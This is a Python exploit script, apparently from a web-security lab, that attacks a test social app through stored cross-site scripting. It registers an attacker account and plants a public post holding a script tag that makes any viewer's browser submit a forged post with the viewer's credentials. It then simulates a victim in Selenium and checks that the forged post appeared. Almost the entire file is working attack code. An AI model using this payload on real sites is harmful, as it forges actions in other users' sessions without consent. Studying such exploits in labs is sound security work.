#!/usr/bin/env python3
import requests, sys
import urllib.parse
from interface import *
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

if not (2 == len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

s = requests.Session()
reset_app(s, url)

attacker_username = 'atacker'
attacker_password = '1337'
register(s, url, username=attacker_username, password=attacker_password)

# make a bad post
new_content = "I JUST GOT OWNED"
new_type = "Public"
xss_script = f'''<script>
    fetch("{url}/create_post", {{
        method: "POST",
        headers: {{
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*"
        }},
        body: "content={urllib.parse.quote_plus(new_content)}&type={urllib.parse.quote_plus(new_type)}",
        credentials: "include",
        cache: "no-cache"
    }}
)
</script>'''

payload = f"Im innocent! {xss_script}"
privacy = "Public" # We want to attack everyone. muahahah
r = create_post(s, url, content=payload, privacy=privacy)
logout(s, url)


victim_username = 'asdf'
victim_password = 'victim'
register(s, url, username=victim_username, password=victim_password)

cookie_dict = s.cookies.get_dict()

# simulate victim opening browser (to execute XSS)
driver = webdriver.Chrome()
driver.get(url) # needed to set cookies in the right domain
for key in cookie_dict:
    driver.add_cookie({
        "name": key,
        "value": cookie_dict[key]
    })
driver.get(url)
driver.close()

r = get_home(s, url)
soup = BeautifulSoup(r.text, 'html.parser')

posts = soup.find_all("div")[10:] # first 10 divs are not posts
assert len(posts) == 6 # 4 previous posts + attacker's post + victim's post

post = posts[-1]
assert new_content in post.text

print("[+] Successfully executed XSS exploit")
